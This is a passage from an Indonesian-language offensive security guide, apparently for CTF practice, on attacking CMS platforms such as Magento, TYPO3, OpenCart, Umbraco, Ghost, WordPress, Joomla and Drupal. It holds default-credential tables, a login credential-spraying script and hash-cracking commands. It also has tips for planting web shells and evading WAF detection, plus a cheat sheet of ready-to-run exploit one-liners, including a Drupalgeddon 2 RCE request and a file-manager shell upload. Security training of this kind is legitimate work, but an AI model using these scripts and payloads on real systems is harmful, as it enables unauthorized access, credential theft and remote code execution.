|---|---|---|---|
|**Magento**|`admin`|_(Dibuat saat install, coba: `admin123`)_|`/admin/`|
|**TYPO3**|`admin`|`password` / `admin`|`/typo3/`|
|**OpenCart**|`admin`|`admin` / `password`|`/admin/`|
|**Concrete CMS**|`admin`|`admin` / `password` / `12345`|`/index.php/login`|
|**Umbraco**|`admin@example.com`|_(Dibuat saat install, coba: `admin`)_|`/umbraco/`|
|**Ghost**|_(Sesuai email admin saat setup awal)_|`admin123`|`/ghost/`|
|**PrestaShop**|`admin@prestashop.com`|`prestashop` / `admin123`|`/admin/` atau `/admin<id>/`|
|**osCommerce**|`admin`|`admin`|`/admin/`|
|**WHMCS**|`admin`|`admin` / `admin123`|`/admin/`|
|**Webmin**|`root` / `admin`|`password` / `root`|`https://TARGET:10000/`|
|**cPanel**|`root`|_(Root server password)_|`https://TARGET:2083/`|

---

## 🤖 Bagian 8: Automation Scripts

### 8.1 Script `cms_detector.sh`

Skrip bash otomatis dengan validasi input untuk mendeteksi CMS secara instan, memverifikasi admin path, dan merekomendasikan tool lanjutannya.

```bash
#!/usr/bin/env bash
# ==============================================================================
# cms_detector.sh - Multi-CMS Fingerprinter & Tool Suggester
# Khusus Parrot Security OS
# ==============================================================================

set -eo pipefail

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

# ----------------- INPUT VALIDATION -----------------
if [[ $# -ne 1 ]]; then
    echo -e "${RED}[-] Error: Parameter target URL tidak ditemukan.${RESET}"
    echo -e "Usage: $0 <TARGET_URL>"
    echo -e "Example: $0 http://10.10.11.200"
    exit 1
fi

TARGET="$1"

# Validasi struktur skema URL
if [[ ! "$TARGET" =~ ^https?:// ]]; then
    echo -e "${RED}[-] Error: Target URL harus menyertakan protokol http:// atau https://${RESET}"
    exit 1
fi

# Hapus trailing slash
TARGET="${TARGET%/}"

echo -e "${BLUE}[*] ====================================================${RESET}"
echo -e "${BLUE}[*]              MULTI-CMS RAPID DETECTOR               ${RESET}"
echo -e "${BLUE}[*] Target: ${TARGET}${RESET}"
echo -e "${BLUE}[*] ====================================================${RESET}"

# 1. Analisis Response Headers & Cookies
HEADERS=$(curl -s -k -I "${TARGET}" || true)
BODY=$(curl -s -k -L "${TARGET}" | head -n 50 || true)

# 2. Logika Deteksi CMS
if echo "$HEADERS" | grep -qi "X-Ghost" || echo "$BODY" | grep -qi "ghost"; then
    echo -e "${GREEN}[+] CMS Terdeteksi: GHOST CMS (Node.js)${RESET}"
    echo -e "    [*] Admin Panel: ${TARGET}/ghost/"
    echo -e "    [*] Rekomendasi: Periksa CVE-2023-40028 (File Read) atau Handlebars SSTI."
    echo -e "    [*] Rujukan: Baca Bagian 6 di ./[🌐 File 17d: Other CMS Exploitation Workflow & Master CMS Reference](/docs/other-cms)"

elif echo "$HEADERS" | grep -qi "UMB_" || echo "$BODY" | grep -qi "umbraco"; then
    echo -e "${GREEN}[+] CMS Terdeteksi: UMBRACO CMS (.NET)${RESET}"
    echo -e "    [*] Admin Panel: ${TARGET}/umbraco/"
    echo -e "    [*] Rekomendasi: Uji Admin XSLT RCE atau CVE-2020-5403."
    echo -e "    [*] Rujukan: Baca Bagian 5 di ./[🌐 File 17d: Other CMS Exploitation Workflow & Master CMS Reference](/docs/other-cms)"

elif echo "$HEADERS" | grep -qi "frontend=" || curl -s -k "${TARGET}/magento_version" | grep -qi "magento"; then
    VER=$(curl -s -k "${TARGET}/magento_version" || true)
    echo -e "${GREEN}[+] CMS Terdeteksi: MAGENTO (${VER:-Unknown Version})${RESET}"
    echo -e "    [*] Rekomendasi: Jalankan magescan atau cek CVE-2022-24086."
    echo -e "    [*] Rujukan: Baca Bagian 1 di ./[🌐 File 17d: Other CMS Exploitation Workflow & Master CMS Reference](/docs/other-cms)"

elif echo "$HEADERS" | grep -qi "fe_typo_user" || echo "$BODY" | grep -qi "typo3"; then
    echo -e "${GREEN}[+] CMS Terdeteksi: TYPO3 CMS${RESET}"
    echo -e "    [*] Admin Panel: ${TARGET}/typo3/"
    echo -e "    [*] Rekomendasi: Enumerate extension atau TypoScript injection."
    echo -e "    [*] Rujukan: Baca Bagian 2 di ./[🌐 File 17d: Other CMS Exploitation Workflow & Master CMS Reference](/docs/other-cms)"

elif echo "$HEADERS" | grep -qi "OCSESSID" || echo "$BODY" | grep -qi "opencart"; then
    echo -e "${GREEN}[+] CMS Terdeteksi: OPENCART${RESET}"
    echo -e "    [*] Admin Panel: ${TARGET}/admin/"
    echo -e "    [*] Rekomendasi: Cek default credentials (admin:admin) atau .ocmod.zip RCE."
    echo -e "    [*] Rujukan: Baca Bagian 3 di ./[🌐 File 17d: Other CMS Exploitation Workflow & Master CMS Reference](/docs/other-cms)"

elif echo "$HEADERS" | grep -qi "CONCRETE" || echo "$BODY" | grep -qi "concrete5"; then
    echo -e "${GREEN}[+] CMS Terdeteksi: CONCRETE CMS (Concrete5)${RESET}"
    echo -e "    [*] Admin Panel: ${TARGET}/index.php/login"
    echo -e "    [*] Rekomendasi: Uji manipulasi Allowed File Types di Dashboard."
    echo -e "    [*] Rujukan: Baca Bagian 4 di ./[🌐 File 17d: Other CMS Exploitation Workflow & Master CMS Reference](/docs/other-cms)"

# Sinyal CMS dari File 17a, 17b, 17c
elif echo "$BODY" | grep -qi "wp-content" || echo "$HEADERS" | grep -qi "wordpress"; then
    echo -e "${GREEN}[+] CMS Terdeteksi: WORDPRESS${RESET}"
    echo -e "    [*] Tool Rekomendasi: wpscan --url ${TARGET} -e u,vp"
    echo -e "    [*] Rujukan File: ./[🛡️ 17a. WordPress Advanced Exploitation & Workflow Guide](/docs/wordpress)"

elif echo "$BODY" | grep -qi "joomla"; then
    echo -e "${GREEN}[+] CMS Terdeteksi: JOOMLA${RESET}"
    echo -e "    [*] Tool Rekomendasi: joomscan -u ${TARGET}"
    echo -e "    [*] Rujukan File: ./[📘 17b — Joomla Workflow: Deep Dive untuk CTF](/docs/joomla)"

elif echo "$HEADERS" | grep -qi "X-Drupal" || echo "$BODY" | grep -qi "drupal"; then
    echo -e "${GREEN}[+] CMS Terdeteksi: DRUPAL${RESET}"
    echo -e "    [*] Tool Rekomendasi: droopescan scan drupal -u ${TARGET}"
    echo -e "    [*] Rujukan File: ./[💧 File 17c: Drupal Pentesting & Exploitation Workflow](/docs/drupal-cms)"

else
    echo -e "${YELLOW}[-] CMS Populer tidak terdeteksi secara otomatis.${RESET}"
    echo -e "    [*] Menjalankan whatweb fingerprinting..."
    whatweb -a 1 "${TARGET}"
fi

echo -e "\n${BLUE}[*] Deteksi Selesai.${RESET}"
```

#### Cara Menjalankan:

```bash
chmod +x cms_detector.sh
./cms_detector.sh http://10.10.11.200
```

---

### 8.2 Script `cms_default_creds.sh`

Skrip untuk melakukan spray kredensial default bawaan CMS terhadap form login target.

```bash
#!/usr/bin/env bash
# ==============================================================================
# cms_default_creds.sh - Default Credentials Sprayer
# ==============================================================================

set -eo pipefail

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
RESET="\e[0m"

if [[ $# -ne 2 ]]; then
    echo "Usage: $0 <TARGET_LOGIN_URL> <CMS_NAME>"
    echo "Supported CMS: opencart, typo3, concrete5, generic"
    echo "Example: $0 http://10.10.11.200/admin/index.php?route=common/login opencart"
    exit 1
fi

LOGIN_URL="$1"
CMS_TYPE=$(echo "$2" | tr '[:upper:]' '[:lower:]')

echo "[*] Menguji kredensial default untuk: $CMS_TYPE pada $LOGIN_URL"

SPRAY_CREDS=(
    "admin:admin"
    "admin:password"
    "admin:admin123"
    "admin:12345"
    "administrator:administrator"
    "root:root"
)

for pair in "${SPRAY_CREDS[@]}"; do
    USER=$(echo "$pair" | cut -d: -f1)
    PASS=$(echo "$pair" | cut -d: -f2)

    echo -n "[-] Mencoba $USER : $PASS ... "
    
    # Kirim POST login generic
    RESPONSE=$(curl -s -i -k -X POST "$LOGIN_URL" \
        -d "username=$USER&password=$PASS&user=$USER&pass=$PASS&submit=Login" || true)

    if echo "$RESPONSE" | grep -Ei "Location:|302 Found|dashboard" | grep -qvi "login"; then
        echo -e "${GREEN}[BERHASIL / POTENTIAL LOGIN!]${RESET}"
        echo -e "${YELLOW}[+] Valid Credential: $USER : $PASS${RESET}"
        exit 0
    else
        echo -e "${RED}[GAGAL]${RESET}"
    fi
done

echo "[-] Tidak ada kredensial default standar yang berhasil."
```

#### Cara Menjalankan:

```bash
chmod +x cms_default_creds.sh
./cms_default_creds.sh http://10.10.11.200/admin/ opencart
```

---

### 8.3 One-Liner Quick Identification

```bash
# 1. Magento Check
curl -s http://10.10.11.200/magento_version; curl -s -I http://10.10.11.200 | grep -i "frontend"

# 2. TYPO3 Check
curl -s -I http://10.10.11.200/typo3/ | grep -i "fe_typo_user"; curl -s http://10.10.11.200 | grep -i "typo3"

# 3. OpenCart Check
curl -s http://10.10.11.200/index.php?route=common/home | grep -i "catalog/view/theme"

# 4. Concrete5 Check
curl -s -I http://10.10.11.200/index.php/login | grep -Ei "CONCRETE|concrete5"

# 5. Umbraco Check
curl -s -I http://10.10.11.200/umbraco/ | grep -i "UMB_"

# 6. Ghost Check
curl -s -I http://10.10.11.200/ghost/ | grep -i "X-Ghost-Cache-Status"
```

---

## 🔑 Bagian 9: Hash Cracking Reference

Format hash dan perintah cracking untuk semua CMS yang dibahas di seri 17a s.d. 17d:

|CMS Platform|Tipe Hash / Format|Hashcat Mode (`-m`)|John Format (`--format=`)|Contoh Pola Hash Realistis|
|---|---|---|---|---|
|**WordPress**|PHPass Portable (MD5)|`400`|`phpass`|`$P$B1234567890abcdefghijklmnopqr.`|
|**Joomla 3+**|Bcrypt (Blowfish)|`3200`|`bcrypt`|`$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy`|
|**Joomla 1/2**|MD5 + Salt|`11`|`dynamic_11`|`f095d32158fe0c2394589d81d6f08fb6:K0Uz4ec0Zbaqqe0t`|
|**Drupal 7/8**|SHA-512 (Drupal standard)|`7900`|`drupal7`|`$S$D2DA1g79/O2aGf0.eY2p8EeVwB5.t7Jb7R2g4m9jL6t3w1q8y9s`|
|**Magento 1**|MD5 + Salt|`11`|`dynamic_11`|`8c6a6c0b5f1a5b8e9d3c2b1a0f9e8d7c:ab`|
|**Umbraco 7**|SHA-1 (Base64)|`100` / `120`|`raw-sha1`|`wvUf7a6hW1vT0mX7d8E+V6c3q1w=`|
|**Umbraco 8+**|PBKDF2 (HMAC-SHA1)|`12000`|`pbkdf2-hmac-sha1`|`AQAAAAEAACcQAAAAEN...`|
|**PrestaShop**|MD5 (Cookie Key + Pass)|`0` (jika salt didapat)|`raw-md5`|`e10adc3949ba59abbe56e057f20f883e`|
|**Ghost CMS**|Bcrypt|`3200`|`bcrypt`|`$2a$10$wN1rB.oI4E9m0Z2zP8x1CeB7o3n2m1k4j5h6g7f8d9s0a`|

#### Command Eksekusi Hashcat:

```bash
# Contoh cracking Hashcat untuk Bcrypt (Joomla 3+ / Ghost)
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Contoh cracking Hashcat untuk Drupal 7/8 ($S$)
hashcat -m 7900 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## ⚠️ Bagian 10: Common Errors & Troubleshooting

| No     | Gejala Error / Kendala                                  | Penyebab Masalah                                                                                | Solusi Pentest                                                                                                    |
| ------ | ------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| **1**  | URL Admin Magento return 404 Not Found                  | Magento 2 secara default mengacak nama direktori admin saat proses instalasi                    | Buka file konfigurasi `app/etc/env.php` via LFI atau cari parameter backend di `pub/static/deployed_version.txt`. |
| **2**  | Upload modul OpenCart `.ocmod.zip` gagal                | Direktori storage penyimpanan sementara tidak memiliki izin tulis (_write permission_)          | Cari alternatif via modifikasi extension template langsung di menu **Design** → **Theme Editor**.                |
| **3**  | Fitur XSLT Files pada Umbraco tidak dapat disimpan      | IIS Application Pool berjalan dengan hak read-only pada folder `/xslt`                          | Manfaatkan upload via Developer → **Script Files** (`.cshtml` Razor template injection).                         |
| **4**  | Ghost CMS menolak file upload symlink                   | Ghost versi ≥≥ 5.58.0 telah menerapkan validasi realpath file sebelum ekstraksi arsip           | Beralih ke pengujian password hash via brute-force login API endpoint `/ghost/api/admin/session`.                 |
| **5**  | Payload TypoScript TYPO3 tidak terpanggil               | Caching halaman frontend aktif sehingga kode TypoScript baru belum dieksekusi                   | Tambahkan `&no_cache=1` pada query URL frontend: `http://TARGET/index.php?id=1&no_cache=1`.                       |
| **6**  | File `shell.php` di Concrete5 tidak dapat diakses       | File disimpan dengan nama acak oleh core concrete file manager                                  | Buka database atau periksa JSON response saat file diupload untuk mendapatkan URL fisik acak file.                |
| **7**  | Hashcat menolak hash Umbraco (`Line-length exception`)  | Hash base64 belum diubah menjadi format heksadesimal standar                                    | Decode string base64 menjadi hex string sebelum dipasok ke Hashcat mode 100/120.                                  |
| **8**  | Bypass `.htaccess` gagal pada CMS berbasis PHP          | Konfigurasi global Apache menggunakan `AllowOverride None` sehingga `.htaccess` lokal diabaikan | Sisipkan shell langsung ke template index aktif daripada bergantung pada penulisan file upload.                   |
| **9**  | WAF memblokir payload XSLT Umbraco                      | Tag `<msxml:script>` dikenali sebagai signature berbahaya oleh rule IDS/WAF                     | Obfusikasi pemanggilan class menggunakan reflection assembly .NET (`System.Reflection.Assembly`).                 |
| **10** | Password reset via database SQL Injection tidak berefek | CMS menggunakan caching sesi berbasis Redis atau Memcached                                      | Restart service cache atau manipulasi record sesi pengguna secara langsung di database.                           |

---

## 📑 Bagian 11: Master Cheatsheet

Referensi gabungan seluruh keluarga CMS (File 17a, 17b, 17c, dan 17d).

### 🎯 Quick Detection One-Liners

```bash
# Multi-CMS Instant Probe
curl -s -k -I http://TARGET | grep -Ei "X-Powered-By|Set-Cookie|X-Ghost|X-Drupal|WordPress"
```

### 🚪 Admin URLs Reference

- **WordPress:** `/wp-login.php` atau `/wp-admin/`
- **Joomla:** `/administrator/`
- **Drupal:** `/user/login` atau `/?q=user/login`
- **Magento:** `/admin/` atau `/admin_<random>/`
- **TYPO3:** `/typo3/`
- **OpenCart:** `/admin/`
- **Concrete CMS:** `/index.php/login`
- **Umbraco:** `/umbraco/`
- **Ghost:** `/ghost/`

---

### 💥 MASTER CVE QUICK REFERENCE (17a s.d. 17d)

Tabel berikut memuat seluruh kerentanan utama yang telah dipelajari di modul 17a, 17b, 17c, dan 17d:

| CMS           | Versi Rentan            | CVE / Identifier  | Tipe Kerentanan          | Command Eksekusi Utama / PoC One-Liner                                                                                                                                                                                                            |
| ------------- | ----------------------- | ----------------- | ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **WordPress** | 6.0 - 6.8               | CVE-2020-25213    | File Manager RCE         | `curl -s -F "cmd=upload" -F "target=l1_Lw" -F "upload[]=@shell.php" http://TARGET/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`                                                                                               |
| **WordPress** | Core < 5.0.1            | CVE-2019-8942     | Image Crop RCE           | `msfconsole -q -x "use exploit/unix/webapp/wp_crop_rce; set RHOSTS TARGET; run"`                                                                                                                                                                  |
| **WordPress** | Core (All)              | XML-RPC Multicall | Brute Force Bypass       | `curl -s -X POST -d @multicall.xml http://TARGET/xmlrpc.php`                                                                                                                                                                                      |
| **WordPress** | Astra < 1.5.2           | CVE-2021-24507    | Authenticated SQLi       | `sqlmap -u "http://TARGET/wp-admin/admin-ajax.php" --data="action=astra_widget_css&style=1*" --dbs`                                                                                                                                               |
| **Joomla**    | 4.0.0 - 4.2.8           | CVE-2023-23752    | Pre-Auth Info Leak       | `curl -s "http://TARGET/api/index.php/v1/config/application?public=true" \| jq .`                                                                                                                                                                 |
| **Joomla**    | 1.5.0 - 3.4.5           | CVE-2015-8562     | User-Agent RCE           | `curl -H "User-Agent: }__test\|O:21:\"JDatabaseDriverMysqli\":3:{...}" http://TARGET/`                                                                                                                                                            |
| **Joomla**    | 3.7.0                   | CVE-2017-8917     | com_fields SQLi          | `sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbs`                                                                                                                                       |
| **Drupal**    | 7.x < 7.58, 8.x < 8.5.1 | **CVE-2018-7600** | **Drupalgeddon 2 (RCE)** | `curl -s -k -X POST "http://TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"` |
| **Drupal**    | 7.x < 7.59, 8.x < 8.5.2 | CVE-2018-7602     | Drupalgeddon 3 (RCE)     | `python3 drupalgeddon3.py -u http://TARGET -c 'id' -user admin -pass password`                                                                                                                                                                    |
| **Drupal**    | 7.0 s.d. 7.31           | CVE-2014-3704     | Drupalgeddon 1 (SQLi)    | `sqlmap -u "http://TARGET/?q=node&destination=node" --data="name[0;...]=test&pass=x&form_id=user_login_block" --dbs`                                                                                                                              |
| **Drupal**    | 8.x < 8.6.10            | CVE-2019-6340     | REST Core RCE            | `curl -X POST "http://TARGET/node?_format=hal_json" -H "Content-Type: application/hal+json" -d @guzzle_payload.json`                                                                                                                              |
| **Magento**   | 2.3.4 - 2.4.3-p1        | CVE-2022-24086    | Pre-Auth Template RCE    | Injeksi directive template `{{var this.getTemplateObject()...}}` pada checkout email                                                                                                                                                              |
| **Magento**   | 2.2.0 - 2.3.1           | CVE-2019-8150     | Pre-Auth SQLi            | `curl "http://TARGET/rest/V1/products?searchCriteria[filterGroups][0][filters][0][conditionType]=in..."`                                                                                                                                          |
| **Magento**   | 1.x (< 1.9.1.1)         | SUPEE-5344        | Shoplift Auth Bypass     | `python2 shoplift_exploit.py TARGET` (Membuat akun admin sekunder via SOAP)                                                                                                                                                                       |
| **TYPO3**     | 9.5.0 - 9.5.7           | CVE-2019-12747    | TypoScript Inject RCE    | Eksploitasi eksekusi kode melalui modifikasi parameter rendering Frontend                                                                                                                                                                         |
| **OpenCart**  | 3.0.3.5 - 3.0.3.7       | CVE-2021-5543     | Arbitrary File Upload    | Unggah arsip `.ocmod.zip` berisi web shell melalui Admin Extension Installer                                                                                                                                                                      |
| **Concrete5** | < 8.5.6                 | CVE-2021-40638    | File Upload Bypass       | Bypass ekstensi avatar uploader menuju direktori `/application/files/`                                                                                                                                                                            |
| **Umbraco**   | 7.x (Semua)             | XSLT Feature RCE  | C# Script Injection      | Masukkan payload `<msxml:script language="CSharp">` pada Developer → XSLT                                                                                                                                                                        |
| **Ghost CMS** | < 5.58.0                | CVE-2023-40028    | Arbitrary File Read      | Unggah arsip ZIP memuat symlink `/etc/passwd` via fasilitas upload gambar                                                                                                                                                                         |

[Lanjut ke File 18: Authentication Bypass Workflow →](/docs/authentication-bypass)